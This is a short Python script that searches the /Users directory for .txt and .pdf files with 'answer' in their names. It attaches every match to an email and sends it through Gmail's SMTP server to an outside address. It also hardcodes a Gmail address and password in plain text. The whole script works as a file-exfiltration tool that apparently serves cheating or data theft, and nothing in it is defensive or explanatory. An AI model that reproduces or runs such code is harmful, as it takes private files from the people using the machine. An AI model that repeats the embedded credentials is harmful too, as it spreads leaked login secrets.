import smtplib
from email.message import EmailMessage as email
import os
import time

# Time Measurement - used for debugging code and improving efficiency
starttime = time.time()

# Email Variables - Needed to specificy contents of email

fromaddr = "16636362dhwhba.cieuwya@gmail.com" # Enter the email you wish to send the data from. i put a random gmail address i created for demonstration purposes, remember that if you decide to use this one i can see all the emails you send and the location from where youve logged in from
frompassword = "Manwoods61732" # Enter the password from the email here
toaddr = "temptestemailforprogram@gmail.com" # Enter the email you wish to receive the data on

msg = email()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "File"


# Functions - Serve different purposes
def findfile(name, extensions, path):
    files = []
    for dirpath, dirname, filename in os.walk(path):
        for item in filename:
            if name in str.lower(item):
                if extensions != []:
                    for extension in extensions:
                        if extension in item:
                            files.append(os.path.join(dirpath, item))
                else:
                    files.append(os.path.join(dirpath, item))
    return files

# Instructions on usage of findfile():
#   - Enter term below IN LOWERCASE that you want to search in the first parameter,
#   - Enter extension you want to search for. please enter it as a list, wether or not you want more than one type of file
#   - Leave the extension as a blank list if you want all file types
#   - Then for the thrid paramter add the root path you want to start searching from
#   - For the whole computer, put "/", but for demonstration purposes i put "/Users"
#     as it is where most people store their files, and there is not point looking through system files


# Main Program
files = findfile("answer", [".txt", ".pdf"], "/Users")

print("Files found!\n")
print("\n".join(files))

# Email Variables - Needed to specificy contents of email

fromaddr = "16636362dhwhba.cieuwya@gmail.com" # Enter the email you wish to send the data from. i put a random gmail address i created for demonstration purposes, remember that if you decide to use this one i can see all the emails you send and the location from where youve logged in from
frompassword = "Manwoods61732" # Enter the password from the email here
toaddr = "davidzatica@icloud.com" # Enter the email you wish to receive the data on

msg = email()
msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "File"

for file in files:
    with open(file, "rb") as data:
        filedata = data.read()
        filename = file.split("/") # splits the name by a "/" which is what seperates the structure of files
        filename = filename[-1] # takes the last item from the structure list as it will always be the name of the file. used for efficiency purposes when searching through recieved files
    
    msg.add_attachment(filedata, maintype="application", subtype="octet-stream", filename=filename)

with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server: # Establishes connection with server
    server.login(fromaddr, frompassword) # Logs into server
    server.send_message(msg) # Sends message

# Prints time taken for program to run, used to measure and improve upon efficiency
print("Time taken: {} Seconds".format(round(time.time()-starttime, 2)))


